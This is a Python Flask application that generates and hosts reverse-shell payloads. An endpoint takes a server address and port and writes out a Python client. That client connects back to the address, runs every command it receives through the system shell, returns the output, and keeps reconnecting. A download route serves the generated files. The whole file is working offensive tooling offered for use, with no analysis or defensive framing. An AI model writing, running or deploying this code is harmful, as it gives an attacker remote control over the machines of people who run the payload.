import os
import random
import string
import socket
from flask import Flask, request, send_from_directory
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

def get_host_ip():
    try:
        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)
        return host_ip
    except:
        return None

ip_address = get_host_ip()

# Define the directory to save the generated scripts
SCRIPT_DIR = 'payloads'

# Ensure the directory exists
if not os.path.exists(SCRIPT_DIR):
    os.makedirs(SCRIPT_DIR)


@app.route('/generate_script', methods=['POST'])
def generate_script():
    user_values = request.json.get('user_values', {})
    if not user_values:
        return {'error': 'No user values provided'}, 400
    print(user_values) 
    # Generate a unique ID for the script
    script_id = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
    script_name = f"{script_id}.py"
    script_path = os.path.join(SCRIPT_DIR, script_name)
    
    # Write the user values to the script
    with open(script_path, 'w') as script_file:
        script_content = generate_script_content(user_values)
        script_file.write(script_content)
        print(f'Generated payload {script_name} hosting @ http://{ip_address}:5000/dl/{script_name}')
        
    return {'script_id': script_id}, 200


@app.route('/dl/<script_id>', methods=['GET'])
def download_script(script_id):
    return send_from_directory(SCRIPT_DIR, f"{script_id}", as_attachment=True)


def generate_script_content(user_values):
    server = user_values.get('server', 'localhost')
    port = user_values.get('port', 8080)
    # Customize the script content based on the user values
    content = f"""
import socket
import subprocess
import time
import threading
import string
import random
import struct

def shell(s):
    while True:
        data = s.recv(1024)
        if data.decode("utf-8").strip() == 'exit':
            break
        if data:
            cmd = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)
            output = cmd.stdout + cmd.stderr
            len_buf = struct.pack('!I', len(output))
            s.sendall(len_buf + output)

server = '{server}'
port = {port}
client_id = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=8))

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((server, port))
        s.send((client_id + '\\n').encode('utf-8'))
        shell_thread = threading.Thread(target=shell, args=(s,))
        shell_thread.start()
        shell_thread.join()
        s.close()
        time.sleep(5)
    except socket.error as e:
        print(f'Connection failed: ')
        time.sleep(5)
    """
    return content



if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)